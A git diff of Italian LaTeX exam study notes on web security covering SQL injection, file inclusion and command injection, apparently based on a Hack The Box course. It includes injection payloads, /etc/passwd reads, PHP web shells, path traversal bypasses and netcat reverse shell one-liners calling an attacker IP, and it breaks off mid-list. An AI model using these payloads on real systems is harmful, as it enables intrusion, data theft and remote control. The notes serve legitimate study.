@@ -1,4 +1,4 @@
-\documentclass[12pt,a4paper]{article}
+\documentclass[12pt,a4paper]{report}
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
 \usepackage{lmodern}
@@ -8,6 +8,20 @@
 \usepackage{listings}
 \usepackage{xcolor}
 \usepackage{tcolorbox}
+\usepackage{lstautogobble} % Rimuove automaticamente gli spazi di indentazione del file .tex
+
+\usepackage{titlesec}
+
+% Formatta il capitolo su una singola riga: "Capitolo X - Titolo"
+\titleformat{\chapter}[hang]
+{\normalfont\Huge\bfseries} % Font grande e in grassetto
+{\chaptertitlename\ \thechapter\ - } % Label (es. "Capitolo 1 - ")
+{0pt} % Spazio extra
+{}
+
+% Rimuove lo spazio bianco gigante che LaTeX mette di default sopra i capitoli
+\titlespacing*{\chapter}{0pt}{-20pt}{20pt}
+
 \tcbuselibrary{skins,breakable}
 
 % Definizione colori per il codice
@@ -17,7 +31,7 @@
 
 \hypersetup{
 	colorlinks=true,
-	linkcolor=keywordcolor,
+	linkcolor=black,
 	filecolor=magenta,      
 	urlcolor=codepurple,
 	pdftitle={Security Exam Toolkit},
@@ -33,6 +47,8 @@
 	upquote=true,
 	commentstyle=\color{codepurple},
 	keywordstyle=\color{keywordcolor}\bfseries,
+	autogobble=true, % <--- AGGIUNGI QUESTA
+	tabsize=4,       % <--- AGGIUNGI QUESTA (imposta la larghezza dei tab)
 }
 
 % Stile personalizzato per le NOTE
@@ -61,19 +77,19 @@
 	\tableofcontents
 	\newpage
 	
-	\section{00 Recon and Utils}
+	\chapter{Recon and Utils}
 	\textit{In questa cartella sono presenti script e tool utili all'enumerazione (es. auto\_enum.sh).}
 	
-	\section{01 Web Security}
+	\chapter{Web Security}
 	
-	\subsection{SQL Injection}
+	\section{SQL Injection}
 	
 	Metto qui solo e soltanto le cose che ritengo importanti a risolvere gli esercizi riguardanti le SQLi e alla compilazione del relativo report.
 	
-	\subsubsection{SQL Basics (MySQL)}
+	\subsection{SQL Basics (MySQL)}
 	Sia il corso di HTB che quello in università si basa su MySQL (nota: MariaDB è un fork di MySQL, quindi se vedi quello vai tranquillo). 
 	
-	\paragraph{Basi SQL e Sintassi (per sicurezza)}
+	\subsubsection{Basi SQL e Sintassi (per sicurezza)}
 	Giusto per avere un recap e non bloccarmi su cavolate di sintassi:
 	\begin{itemize}
 		\item \textbf{SELECT:} \texttt{SELECT column1, column2 FROM table\_name WHERE condition;}
@@ -99,32 +115,32 @@
 		L'\texttt{AND} ha la precedenza sull'\texttt{OR}. Se scrivo \texttt{A AND B OR C}, viene valutato come \texttt{(A AND B) OR C}. Per forzare una priorità diversa servono le parentesi: \texttt{A AND (B OR C)}.
 	\end{nota}
 	
-	\paragraph{Command line login}
+	\subsubsection{Command line login}
 	Posto di aver scoperto durante l'enumerazione (nmap) che c'è una porta aperta che espone il database MySQL, e posto di aver trovato altrove delle credenziali valide (teoricamente si può fare brute forcing, ma per questioni di tempo dubito fortemente che in esame sarà il caso), allora si può accedere al DB MySQL mediate un comando del tipo:
 	\begin{lstlisting}[language=bash]
 		mysql -u USER -h HOST_IP -P HOST_PORT -p
 	\end{lstlisting}
 	Il -p serve ad indicare la password, ma viene lasciato vuoto per evitare che essa appaia in chiaro su .bash\_history (o come si chiama): la password verrà quindi chiesta una volta lanciato il comando.
 	
-	\paragraph{Il Punto e Virgola}
+	\subsubsection{Il Punto e Virgola}
 	Importante ricordare che una query è sempre terminata da un punto e virgola. Tuttavia questo non vale nel caso di \textit{[Testo originale interrotto]}
 	
-	\paragraph{Gli Apici}
+	\subsubsection{Gli Apici}
 	MySQL permette i numeri con gli apici facendo un cast automatico. A livello pratico: se il parametro è palesemente numerico (es: ?id=5) prova prima i payload senza apici (es: 5 OR 1=1); se è una stringa (es: ?user=admin) l'apice ci vuole.
 	
-	\paragraph{Database e Schema}
+	\subsubsection{Database e Schema}
 	Di base funziona così: un DBMS contiene diversi Schema (schemi), che a loro volta contengono diverse Table (tabelle). Per qualsivoglia motivo in MySQL hanno deciso di rendere DATABASE un sinonimo di SCHEMA, il che implica che alcuni comandi a noi utili hanno più versioni corrette. Un esempio è sicuramente:
 	\begin{lstlisting}[language=SQL]
 		SHOW DATABASES;
 		SHOW SCHEMAS;
 	\end{lstlisting}
 	
-	\paragraph{I Metacaratteri e l'operatore LIKE}
+	\subsubsection{I Metacaratteri e l'operatore LIKE}
 	Di nuovo, giusto per non confonderci le idee, invece di * e ? abbiamo \% e \_ . Inoltre, si usano solamente con l'operatore LIKE (es: WHERE id = '5' AND user LIKE '\%admin\%').
 	
-	\subsubsection{Le SQL Injection}
+	\subsection{Le SQL Injection}
 	
-	\paragraph{Le categorie}
+	\subsubsection{Le categorie}
 	Le SQLi si dividono in:
 	\begin{itemize}
 		\item \textbf{In-band} $\rightarrow$ Ovvero se l'output della query ci è direttamente visibile. Si dividono a loro volta in Error Based e Union Based (vedremo poi che vuol dire).
@@ -133,7 +149,7 @@
 	\end{itemize}
 	Fino a prova contraria, per fortuna noi ci occuperemo solo delle In-band, sia Error Based che Union Based.
 	
-	\paragraph{L'URL Encoding}
+	\subsubsection{L'URL Encoding}
 	L'URL encoding (o percent-encoding) serve per codificare i caratteri speciali in modo che non "rompano" la richiesta HTTP (es. gli spazi, i \texttt{\&}, gli \texttt{=}). Regola d'oro: quando l'injection avviene via GET (nell'URL), i caratteri speciali devono essere codificati.
 	
 	Esempi rapidi:
@@ -145,7 +161,7 @@
 	\end{itemize}
 	Dato che la parte sull'url encoding (e anche l'aggiramento dei filtri) è comune a tutta la web security e non solo alle SQLi, magari qui facciamo un accenno e spieghiamo meglio in un file a parte.
 	
-	\subsubsection{SQLi - Error Based}
+	\subsection{SQLi - Error Based}
 	La prima cosa da fare è verificare se la query è vulnerabile, o meglio se il codice (es: PHP) è stato scritto in modo poco sicuro, rendendo la query vulnerabile. Non abbiamo accesso al codice, ma il modo più semplice per fare ciò è provare a mettere in un campo alla volta un singolo apice ' (o anche " o \textbackslash{} a quanto mi pare di capire). Il o i campi vulnerabili saranno quelli che causano un comportamento inatteso (es: qualcosa di diverso da login success/login fail in caso di login); il motivo è che usando MySQL gli apici, in mancanza di operazioni di "pulizia" dell'input la query diventa qualcosa del tipo: 
 	\begin{lstlisting}[language=SQL]
 		SELECT * FROM credentials WHERE user = ''' AND password = '';
@@ -162,7 +178,7 @@
 	
 	Premessa: baserò la spiegazione sulla query di login già vista come esempio, dato che la tipologia e difficoltà dovrebbe essere molto simile. Ciò non toglie però che in caso di query diverse e/o più complesse la cosa diventa meno banale (detto ciò, riguardandosi la sezione sull'ordine degli operatori e ragionando un po' sulla logica dovrebbe essere più che fattibile).
 	
-	\paragraph{OR Injection}
+	\subsubsection{OR Injection}
 	// Questa injection viene usata quando si conosce un valore valido (e per noi rilevante) di uno dei campi vulnerabili (ripeto, questo criterio vale solo per query simili, ovvero con un unico AND ecc.).\\
 	Partiamo dalla query di login:
 	\begin{lstlisting}[language=SQL]
@@ -205,7 +221,7 @@
 		Nel secondo caso la query restituisce tutte le righe, ma le web app di solito processano solo la prima restituita dal DBMS, che solitamente è l'admin.
 	\end{nota}
 	
-	\paragraph{Comment Injection}
+	\subsubsection{Comment Injection}
 	\begin{nota}
 		Questo tipo di SQLi in realtà mi pare più semplice della OR Injection, quindi magari può essere opportuno scambiarne l'ordine qui (scambiando probabilmente in questo modo l'ordine in cui vengono tentate).
 	\end{nota}
@@ -258,10 +274,10 @@
 	\end{lstlisting}
 	Da notare che questo non solo ci permette di fare login senza password di un qualsiasi utente valido, ma permette anche di, posto che 'admin' abbia id = '0', fare il login come admin!
 	
-	\subsubsection{SQLi - Union Based}
+	\subsection{SQLi - Union Based}
 	Questo tipo di injection si basa appunto sulla UNION, che permette di fare più SELECT e unire poi i risultati in una sola vista.
 	
-	\paragraph{Numero di Colonne}
+	\subsubsection{Numero di Colonne}
 	Di base UNION lavora solo con select aventi lo stesso numero di colonne, quindi:
 	\begin{itemize}
 		\item Se le due query ritornano già lo stesso numero di colonne allora perfetto, siamo pronti.
@@ -272,7 +288,7 @@
 		\end{itemize}
 	\end{itemize}
 	
-	\paragraph{Column Enumeration}
+	\subsubsection{Column Enumeration}
 	Per poter effettuare la Union Based SQLi bisogna prima quindi capire quante colonne ha la tabella iniziale. Ci sono 2 metodi totalmente analoghi tra loro:
 	\begin{itemize}
 		\item \textbf{ORDER BY:} Usando un payload del tipo \texttt{"' order by X-- -"} (dove X è il numero della colonna da usare per l'ordinamento) in modo incrementale partendo da X=1, se la query fallisce per X=k allora il numero di colonne sarà k-1.
@@ -285,7 +301,7 @@
 	\subsection{Exploitation}
 	Vediamo ora il workflow da usare per exploitare una vulnerabilità in un DBMS MySQL.
 	
-	\paragraph{È MySQL?}
+	\subsubsection{È MySQL?}
 	Per capire se ci troviamo davanti ad un DBMS MySQL, i segni solitamente sono:
 	\begin{itemize}
 		\item Una porta la cui descrizione è letteralmente MySQL (o MariaDB).
@@ -312,7 +328,7 @@
 		\end{lstlisting}
 	\end{nota}
 	
-	\paragraph{Schemata}
+	\subsubsection{Schemata}
 	Tabella che contiene le informazioni riguardo tutti gli Schema presenti nel DBMS. Possiamo fare quindi enumerazione degli Schema con una query di questo tipo:
 	\begin{lstlisting}[language=SQL]
 		SELECT schema_name FROM information_schema.schemata;
@@ -323,19 +339,19 @@
 		SELECT database();
 	\end{lstlisting}
 	
-	\paragraph{Tables}
+	\subsubsection{Tables}
 	Una volta trovato uno Schema che ci interessa, che chiameremo SchemaX, andiamo a fare l'enumerazione delle Tables in quello Schema mediante la tabella Tables dentro ad Information\_Schema:
 	\begin{lstlisting}[language=SQL]
 		SELECT table_name FROM information_schema.tables WHERE table_schema = 'SchemaX';
 	\end{lstlisting}
 	
-	\paragraph{Columns}
+	\subsubsection{Columns}
 	Analogamente, avendo trovato una Table che ci interessa (che chiameremo TableY) andiamo a fare l'enumerazione delle Columns in quella Table mediante la tabella Columns dentro ad Information\_Schema:
 	\begin{lstlisting}[language=SQL]
 		SELECT column_name FROM information_schema.columns WHERE table_schema = 'SchemaX' AND table_name = 'TableY';
 	\end{lstlisting}
 	
-	\paragraph{Data}
+	\subsubsection{Data}
 	Una volta ottenuti Schema, Table e Columns possiamo procedere all'estrazione dei dati che ci interessano veramente, con una query del tipo:
 	\begin{lstlisting}[language=SQL]
 		SELECT Campo1, Campo2 FROM SchemaX.TableY;
@@ -350,7 +366,7 @@
 	\subsubsection{Lettura di File}
 	Poter leggere i dati all'interno di un DBMS, soprattutto al giorno d'oggi, è in realtà tutt'altro che scontato: solitamente, solo i DB Admin hanno i privilegi necessari.
 	
-	\paragraph{I Privilegi}
+	\subsubsection{I Privilegi}
 	Iniziamo subito provando a vedere il nostro user corrente, usando una delle seguenti query (ovviamente adattate a UNION):
 	\begin{lstlisting}[language=SQL]
 		SELECT user();
@@ -371,7 +387,7 @@
 		Il privilegio di leggere i file è indicato come Privilege\_Type = 'FILE'.
 	\end{nota}
 	
-	\paragraph{Load\_File}
+	\subsubsection{Load\_File}
 	Una volta che sappiamo che possiamo leggere i file, possiamo provare a leggere dei file sensibili, come /etc/passwd:
 	\begin{lstlisting}[language=SQL]
 		SELECT Load_File('/etc/passwd');
@@ -387,14 +403,14 @@
 	\subsubsection{Scrittura di File}
 	Per scrivere dentro a dei file nel backend server di un DBMS non basta il privilegio FILE, ma serve altro.
 	
-	\paragraph{Secure\_File\_Priv}
+	\subsubsection{Secure\_File\_Priv}
 	Questa variabile dice se e dove ho privilegi di lettura/scrittura: NULL $\rightarrow$ Da nessuna parte, Vuota $\rightarrow$ ovunque, Una/certa/dir $\rightarrow$ Solo in quella dir. Ovviamente tutto ciò posto di avere il privilegio FILE. 
 	I DBMS moderni ormai la settano su NULL o su percorsi blindati di default, rendendo questa vulnerabilità molto più rara in contesti reali aggiornati.
 	\begin{lstlisting}[language=SQL]
 		SELECT Variable_Name, Variable_Value FROM Information_Schema.Global_Variables WHERE Variable_Name="Secure_File_Priv";
 	\end{lstlisting}
 	
-	\paragraph{SELECT INTO OUTFILE}
+	\subsubsection{SELECT INTO OUTFILE}
 	Posto di aver verificato di avere i privilegi corretti, possiamo scrivere su dei file mediante una SELECT diversa dalla SELECT FROM:
 	\begin{lstlisting}[language=SQL]
 		SELECT * FROM users INTO OUTFILE '/tmp/credentials';
@@ -411,7 +427,7 @@
 		In realtà vengono scritti anche i numeri 1 3 4 insieme alla stringa voluta, quindi se si volesse un output pulito si metterebbero stringhe vuote "" al posto dei numeri.
 	\end{nota}
 	
-	\paragraph{Generare una Shell}
+	\subsubsection{Generare una Shell}
 	Posto che abbiamo detto che probabilmente casi del genere non ci capiteranno mai in esame, il corso di HTB propone un ultima cosa, ovvero di scrivere in un file PHP la seguente stringa:
 	\begin{lstlisting}[language=PHP]
 		<?php system($_REQUEST[0]); ?>
@@ -428,7 +444,307 @@
 		La fonte di questo file è il corso gratuito HTB che trovate al link https://academy.hackthebox.com/app/module/33. Tale corso include anche una sezione sul come evitare le SQLi ed un caso d'uso reale molto interessante che però comprende anche un utilizzo avanzato di Burp Suite; ho tralasciato tali sezioni in quanto questo documento è volto allo svolgimento dell'esame.
 	\end{nota}
 	
-	\subsection{Command Injection}
-	\textit{In questa sezione andranno inseriti gli appunti o i riferimenti per la Command Injection.}
+	\section{File Inclusion}
+	
+	Molti dei linguaggi moderni usati per il back-end di applicazioni web (PHP, Javascript, Java ecc) permettono di "includere" file nel render di una determinata pagina (in questo modo parti come il footer vengono scritte una volta sola e incluse in tutte le altre pagine). In diversi casi inoltre, quale specifico file includere è determinato da un parametro GET: per file inclusion si intende proprio la manipolazione di tale parametro per riuscire a stampare a schermo dei file riservati presenti sulla macchina dove gira il backend.
+	
+	\begin{nota}
+		Alcune delle effettive funzioni (es: \texttt{include()} in PHP) permettono non solo la lettura ma anche l'esecuzione di determinati file, ma noi ci limiteremo a vedere la parte di lettura. CREDO?
+	\end{nota}
+	
+	\subsection{Local File Inclusion}
+	Come già accennato, questa è la versione base del concetto, in cui andiamo semplicemente ad inserire un path assoluto o relativo come parametro GET nell'URL, in modo da stamparlo. Solitamente il file usato per dimostrare questa vulnerabilità è \texttt{/etc/passwd} (su Linux almeno).
+	
+	\subsubsection{Basic LFI}
+	Se la funzione backend prende solo e soltanto il parametro GET allora basta mettere il nome del file:
+	\begin{lstlisting}[language=bash]
+		http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
+	\end{lstlisting}
+	
+	\subsubsection{Path Traversal}
+	Se a backend viene messo un prefisso al parametro GET (metti per esempio \texttt{./languages/}), allora bisogna usare i path relativi:
+	\begin{lstlisting}[language=bash]
+		http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
+	\end{lstlisting}
+	Questo funziona perchè partiamo dalla cartella indicata dal prefisso (\texttt{./languages/}) e andiamo "all'indietro" mediante i \texttt{../}. Proprio per questo si chiama Path Traversal.
+	
+	\begin{nota}
+		Lo shortcut \texttt{../} è fatto in modo che se arrivi a \texttt{/} non va più indietro, quindi non c'è bisogno di preoccuparsi di "quanto indietro esattamente bisogna andare": basta esagerare.
+	\end{nota}
+	
+	\subsubsection{Filename Prefix}
+	Se a backend viene messo un prefisso che NON è una cartella (per esempio \texttt{lang\_}) la situazione è un po' più incerta: il metodo qui consiste nel far partire il nostro parametro con uno \texttt{/} in modo che l'OS riconosca il prefisso come cartella (\texttt{lang\_/}). Tuttavia ciò funziona solo nel momento in cui la cartella in questione esiste veramente nel file system.
+	
+	\begin{nota}[DOMANDA]
+		In questo esempio, ovvero \texttt{lang\_/}, la cartella in questione viene cercata dove? Cioè viene considerato path assoluto (\texttt{/lang\_/}) o relativo (\texttt{./lang\_/})?
+	\end{nota}
+	
+	\subsubsection{File Extensions}
+	Spesso il parametro GET è il nome del file senza l'estensione, che viene aggiunta a backend. Questo, oltre a rendere più puliti gli URL, impedisce di fare una LFI per come le abbiamo viste ora, dato che \texttt{/etc/passwd} diventerebbe per esempio \texttt{/etc/passwd.php}. Vedremo le possibili soluzioni in seguito.
+	
+	\subsubsection{Second-Order Attacks}
+	Questo tipo di attacchi è identico ai precedenti concettualmente, semplicemente il modo in cui viene caricato il payload malevolo è diverso: invece di inserirlo nell'URL direttamente, si "avvelena" un valore che l'applicazione web salva e poi utilizza in un secondo momento. L'esempio fatto nel corso di HTB è, trovato un punto dell'applicazione web in cui viene usato come parametro l'username, il creare un utente con username "\texttt{../../../../etc/passwd}".
+	
+	\subsection{Basic Filters Bypasses}
+	Vediamo quali sono i filtri più comuni applicati per evitare le FI, e come bypassarli.
+	
+	\subsubsection{Non-Recursive Path Traversal Filters}
+	Uno dei metodi logicamente più immediati è eliminare tutte le istanze di \texttt{../} dal parametro GET. Tuttavia, se questo processo avviene in modo non ricorsivo (quindi una volta, o comunque un numero determinato di volte) la soluzione è estremamente semplice, ovvero fare in modo di ottenere una nuova stringa \texttt{../} a seguito dell'eliminazione di quella esistente (con \texttt{....//}): 
+	\begin{lstlisting}[language=bash]
+		http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
+		
+		# Con un filtro che elimina tutte le stringhe ../ otteniamo:
+		
+		http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
+	\end{lstlisting}
+	
+	\begin{nota}
+		La stringa \texttt{....//} non è l'unica possibile, ce ne sono molte altre, come \texttt{..././} e \verb|....\/|.
+	\end{nota}
+	
+	\subsubsection{URL Encoding}
+	Un controllo possibile, che è ancora più stringente di quello appena visto, è impedire l'uso dei caratteri \texttt{/} e \texttt{.}. In se è un'ottima idea, eccetto che in alcuni contesti (soprattutto se meno recenti) a seconda di a che livello è implementato e come il filtro esso può essere bypassato mediante semplice URL encoding. In altre parole, se invece di fornire una stringa \texttt{../} usiamo la sua forma URL encoded \texttt{\%2e\%2e\%2f}, se il programma prima effettua il controllo e solo dopo la decodifica il filtro è stato bypassato.
+	
+	\begin{nota}
+		Per più dettagli su come bypassare filtri sull'URL vedi la parte delle Command Injections.
+	\end{nota}
+	
+	\subsubsection{Approved Paths}
+	Un altro filtro che spesso viene applicato è quello di verificare che il path del file richiesto sia dentro una determinata cartella (usando una RegEx). Anche questa è un'opzione valida, ma se non si implementa correttamente la vulnerabilità resta: il concetto è identico alla sezione Path Traversal vista in precedenza, con la sola differenza che va fatta una prima fase di navigazione tra le pagine per scoprire qual è il path della cartella "approvata", dato che in questo caso siamo noi a doverlo mettere direttamente nel parametro GET (prima veniva aggiunto a backend).
+	
+	\subsubsection{Appended Extension}
+	Discutiamo qui la sezione vista in precedenza File Extensions. Molte applicazioni applicano questo tipo di filtro, e nelle versioni aggiornate di PHP ecc questo blocco è quasi impossibile da superare. Detto questo, nelle suddette condizioni (es: PHP < 5.4) ci sono due possibili metodi di aggirare questo tipo di filtro:
+	\begin{itemize}
+		\item \textbf{Path Truncation:} Consiste nell'allungare il path fornito con migliaia di \texttt{./} fino ad arrivare ai 4096 byte che PHP aveva dato come lunghezza massima del path. Per intenderci, fornendo un path lungo esattamente 4096 byte i 4 byte della stringa \texttt{.php} verrebbero tagliati.
+		\item \textbf{Null Byte:} In linguaggi di basso livello come C, su cui PHP è basato, il "Null Byte" (\texttt{\%00}) è un carattere speciale che indica il fine stringa. Aggiungendolo dunque alla fine del path fornito si andava ad evitare che i 4 byte dell'estensione \texttt{.php} verrebbero letti.
+	\end{itemize}
+	
+	\begin{nota}
+		Questa parte non penso sia parte del programma d'esame.
+	\end{nota}
+	
+	\subsection{Remote File Inclusion}
+	La Remote File Inclusion si verifica quando l'applicazione web non solo permette di includere file arbitrari (come nella LFI), ma accetta anche URL esterni. Questo ci permette di far caricare e interpretare al server vittima un nostro script malevolo (es. una reverse shell in PHP) ospitato su una nostra macchina.
+	
+	\subsubsection{Requisito Fondamentale (su PHP):}
+	Affinché funzioni, la configurazione \texttt{php.ini} del server bersaglio deve avere \texttt{allow\_url\_include = On}.
+	
+	\subsubsection{Come si esegue:}
+	\begin{enumerate}
+		\item \textbf{Creare il payload:} Sulla nostra macchina, creiamo uno script malevolo. Ad esempio un file \texttt{shell.php} che esegue comandi passati via GET:
+		\begin{lstlisting}[language=PHP]
+			<?php system($_GET['cmd']); ?>
+		\end{lstlisting}
+		\item \textbf{Hostare il file:} Dobbiamo esporre questo file tramite un server web sulla nostra macchina (es. sulla porta 80 o 8000). Python è comodissimo per questo:
+		\begin{lstlisting}[language=bash]
+			sudo python3 -m http.server 80
+		\end{lstlisting}
+		\item \textbf{Inviare il payload:} Sulla macchina vittima, passiamo l'URL del nostro server come parametro vulnerabile:
+		\begin{lstlisting}[language=bash]
+			http://<SERVER_IP>:<PORT>/index.php?language=http://<NOSTRO_IP>/shell.php&cmd=whoami
+		\end{lstlisting}
+	\end{enumerate}
+	In questo modo il server scaricherà \texttt{shell.php} dalla nostra macchina, lo includerà e la funzione \texttt{system()} eseguirà il comando \texttt{whoami}!
+	
+	\subsection{Automated Scanning}
+	Invece di provare manualmente decine di combinazioni per il Path Traversal (\texttt{../}, \texttt{....//}, \texttt{\%2e\%2e\%2f}, ecc.), diamo in pasto a un tool automatico una lista di payload pronti (Wordlist). Il tool li prova tutti in pochi secondi e ci evidenzia quale ha avuto successo.
+	
+	\textbf{Where to find Wordlists:}\\
+	Sulla macchina Parrot (usata in laboratorio) è preinstallato il pacchetto \texttt{SecLists}. I payload per le File Inclusion si trovano in genere in:
+	\texttt{/usr/share/seclists/Fuzzing/LFI/} (es. il file \texttt{LFI-Jhaddix.txt} o simili).
+	Se SecLists è troppo dispersivo o lento da eseguire tutto, puoi crearti un file di testo (es. \texttt{lfi\_list.txt}) e incollarci dentro a mano 15-20 payload chiave presi dal cheatsheet (es. null byte, url encoding, path truncation) e fuzzare solo con quelli.
+	
+	\subsubsection{Fuzz Faster U Fool}
+	\texttt{ffuf} (Fuzz Faster U Fool) è uno strumento da riga di comando. 
+	
+	\textbf{Basic Command:}
+	\begin{lstlisting}[language=bash]
+		ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://<SERVER_IP>:<PORT>/index.php?language=FUZZ"
+	\end{lstlisting}
+	\begin{itemize}
+		\item \texttt{-w}: Specifica il percorso della tua wordlist.
+		\item \texttt{-u}: Specifica l'URL bersaglio.
+		\item \texttt{FUZZ}: È la parola chiave obbligatoria. Dice a ffuf \textbf{dove} inserire esattamente i payload della wordlist.
+	\end{itemize}
+	
+	\textbf{Handling False Positives:}\\
+	Se il server risponde sempre con un \texttt{200 OK} anche quando il payload fallisce (perché magari carica la pagina di default vuota), \texttt{ffuf} ti mostrerà \textit{tutti} i tentativi come "successo".
+	Per trovare quello giusto, devi guardare la dimensione della pagina (colonna \textbf{Size}). 
+	\begin{enumerate}
+		\item Lancia il comando base e fermalo subito (\texttt{Ctrl+C}).
+		\item Guarda la "Size" dei payload falliti (es. \texttt{Size: 1250}).
+		\item Rilancia il comando aggiungendo il parametro \texttt{-fs} (Filter Size) per ignorare le risposte di quella dimensione:
+	\end{enumerate}
+	\begin{lstlisting}[language=bash]
+		ffuf -w wordlist.txt -u "http://<SERVER_IP>/index.php?language=FUZZ" -fs 1250
+	\end{lstlisting}
+	In questo modo, il terminale ti stamperà \textbf{solo} il payload che ha fatto cambiare dimensione alla pagina (cioè quello che ha caricato il contenuto aggiuntivo di \texttt{/etc/passwd}).
+	
+	\subsubsection{Metodo 2: Interfaccia Grafica con Burp Suite Intruder}
+	
+	Utile se hai già Burp aperto per intercettare le richieste HTTP e preferisci un approccio visivo.
+	
+	\paragraph{Procedura Step-by-Step:}
+	\begin{enumerate}
+		\item \textbf{Intercetta la richiesta vulnerabile} nella scheda \textit{Proxy} di Burp (es. una richiesta GET con \texttt{?language=it}).
+		\item Fai clic con il tasto destro sulla richiesta e seleziona \textbf{Send to Intruder} (\texttt{Ctrl+I}).
+		\item Vai nella scheda \textbf{Intruder -> Positions}:
+		\begin{itemize}
+			\item Fai clic sul pulsante \textbf{Clear \S} (sulla destra) per rimuovere tutti i marcatori automatici.
+			\item Evidenzia solo il valore che desideri sottoporre a fuzzing (es. evidenzia \texttt{it} in \texttt{?language=it}).
+			\item Fai clic su \textbf{Add \S}. L'URL dovrebbe ora apparire così: \texttt{?language=\S{}it\S{}}.
+		\end{itemize}
+		\item Vai nella scheda \textbf{Payloads}:
+		\begin{itemize}
+			\item Sotto la sezione \textit{Payload Options [Simple list]}, fai clic su \textbf{Load} e seleziona il file della tua wordlist.
+			\item Deseleziona la spunta su "`Payload Encoding"' in fondo per evitare che Burp codifichi caratteri come \texttt{/} e \texttt{.}.
+		\end{itemize}
+		\item Fai clic su \textbf{Start Attack} (in alto a destra).
+	\end{enumerate}
+	
+	\paragraph{Come leggere i risultati:}
+	Si aprirà una nuova finestra contenente una tabella. Se i codici di stato HTTP sono tutti \texttt{200}, ignorali. Fai clic sull'intestazione della colonna \textbf{Length} per ordinare le risposte in base alla dimensione. La richiesta che presenta una lunghezza (\textit{Length}) significativamente disallineata rispetto alle altre rappresenta il payload andato a buon fine!
+	
+	\section{Command Injection}
+	
+	Questa vulnerabilità si verifica quando l'applicazione web passa l'input dell'utente direttamente a una shell di sistema senza i corretti controlli sull'input stesso.
+	\\
+	Tipicamente l'input fornito dall'utente mediante la WebApp è un parametro passato ad un comando in una shell (es: fornire l'IP per il comando ping). In tale situazione si tratta di riuscire a concatenare un secondo comando al primo (es: \texttt{ping IP; cat /etc/passwd}).
+	
+	\subsection{Metodologia di Attacco Step-by-Step}
+	
+	\begin{enumerate}
+		\item \textbf{Analisi del comportamento standard:} Identifica l'input atteso. Se inserendo \texttt{file.txt} il server restituisce le statistiche del file, il comando interno è probabilmente \texttt{stat file.txt}.
+		\item \textbf{Rilevamento dei caratteri filtrati:} L'obiettivo è individuare una "versione" valida del payload che vogliamo inviare. Per farlo si può andare a tentativi direttamente col payload o iniziare inviando i caratteri separatori uno alla volta per capire cosa viene bloccato, creando un unico payload solo alla fine.
+		\item \textbf{Invio del payload:}
+		Una volta strutturato il payload, lo inviamo. Se lo scenario è In-Band l'output verrà mostrato direttamente a schermo; se lo scenario è Blind, sarà necessario procedere tramite il canale alternativo descritto nella sezione successiva.
+	\end{enumerate}
+	
+	\subsection{Caso Particolare: Reverse Shell}
+	
+	Quando ci si trova in uno scenario \textit{Blind} (l'output del comando non è visibile nella risposta HTTP), l'obiettivo principale è costringere il server a connettersi all'attaccante e passargli il controllo di una shell. Prima di inviare il payload, è fondamentale assicurarsi di avere un listener TCP in ascolto sulla propria macchina d'attacco tramite il comando: \texttt{nc -lvnp 4444}.
+	
+	\subsubsection{Opzione 1: Netcat con flag -e (Iniezione Diretta)}
+	Se la macchina vittima dispone di una versione classica o non protetta di Netcat, è possibile reindirizzare la shell direttamente specificando l'eseguibile tramite il flag \texttt{-e}:
+	\begin{lstlisting}[backgroundcolor=\color{codegray}, basicstyle=\ttfamily\small, breaklines=true]
+		; nc <IP_ATTACCANTE> 4444 -e /bin/bash
+	\end{lstlisting}
+	
+	\subsubsection{Opzione 2: Named Pipe FIFO (Bypass per Netcat Moderni/Protetti)}
+	Nelle distribuzioni Linux moderne, la versione standard di Netcat viene compilata senza il supporto al flag \texttt{-e} per motivi di sicurezza. Per superare questa mitigazione, si utilizza un payload avanzato basato su una \textbf{Named Pipe (FIFO)}, che permette di ridirigere i flussi di input e output creando un ciclo continuo:
+	
+	\begin{lstlisting}[backgroundcolor=\color{codegray}, basicstyle=\ttfamily\small, breaklines=true]
+		; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_ATTACCANTE> 4444 >/tmp/f
+	\end{lstlisting}
+	
+	Di seguito viene analizzato il funzionamento dettagliato del comando, componente per componente:
+	
+	\begin{itemize}
+		\item \textbf{\texttt{;}} $\rightarrow$ È il separatore di comandi iniziale. Serve a chiudere bruscamente l'istruzione legittima avviata dal server web e a imporre l'esecuzione immediata del nostro payload, a prescindere dal successo o dal fallimento del comando precedente.
+		\item \textbf{\texttt{rm /tmp/f}} $\rightarrow$ Rimuove in modo preventivo il file chiamato \texttt{f} all'interno della directory temporanea \texttt{/tmp/}, qualora fosse già presente a causa di un precedente tentativo di attacco fallito. Questo evita collisioni ed errori nel passaggio successivo.
+		\item \textbf{\texttt{mkfifo /tmp/f}} $\rightarrow$ Crea una \textit{Named Pipe} (chiamata anche FIFO - First In, First Out) con il nome \texttt{f} nella directory \texttt{/tmp/}. A differenza dei file normali, una named pipe sul filesystem Linux agisce come un canale di comunicazione bidirezionale in tempo reale tra processi.
+		\item \textbf{\texttt{cat /tmp/f}} $\rightarrow$ Legge costantemente il contenuto che entra all'interno della pipe \texttt{/tmp/f} e lo spinge verso l'esterno sul proprio canale di Standard Output (\textit{stdout}).
+		\item \textbf{\texttt{\textbar}} $\rightarrow$ È l'operatore di \textit{pipe} classico della shell Linux. Prende lo Standard Output del comando a sinistra (\texttt{cat}) e lo incanala direttamente nello Standard Input (\textit{stdin}) del comando alla sua destra.
+		\item \textbf{\texttt{/bin/sh -i}} $\rightarrow$ Avvia un'istanza della shell di sistema (\texttt{sh}) in modalità interattiva (\texttt{-i}). Essendo collegata alla pipe tramite l'operatore precedente, questa shell riceverà ed eseguirà come comandi operativi tutto ciò che transita dentro \texttt{/tmp/f}.
+		\item \textbf{\texttt{2\textgreater{}\&1}} $\rightarrow$ Redirige il canale dello Standard Error (file descriptor 2) all'interno del canale dello Standard Output (file descriptor 1). In questo modo, se si digita un comando errato o si riceve un errore di sistema nella shell remota, l'errore verrà trasmesso indietro all'attaccante invece di perdersi localmente sul server web.
